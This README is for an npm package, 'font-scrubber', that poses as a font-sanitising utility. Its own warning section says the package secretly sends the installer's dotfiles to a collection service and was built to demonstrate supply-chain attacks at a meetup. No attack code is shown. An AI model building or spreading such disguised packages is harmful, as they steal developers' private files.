# Scrub fonts to be more secure!

This package scrubs fonts and makes sure you always use a secure font-face!

## Install

```bash
$ npm install font-scrubber
```

Security protip: Whatever you do, do not install this as root or with
sudo. Always install packages in your home dir or - better - in the
homedir of a separate user you use specifically for development.

Never `curl | bash`. Or you deserve it.

## Usage (ES6+)

```js
// Load dependency.
import scrubFontName from 'font-scrubber';

// Make sure this font is acceptable.
let goodFont = scrubFontName("'Comic Sans MS'");
```

## Warning!

This package should never be used. It will ship a selection of dotfiles
from your machine to a collection service
(https://github.com/pubkraal/wwwgather). This entire thing is built for
educational and demonstration purposes.

If you'd like to see the demo live, join us on
https://www.meetup.com/Bynder-JS-Guild/events/241906747/ or
alternatively view the recording afterwards.

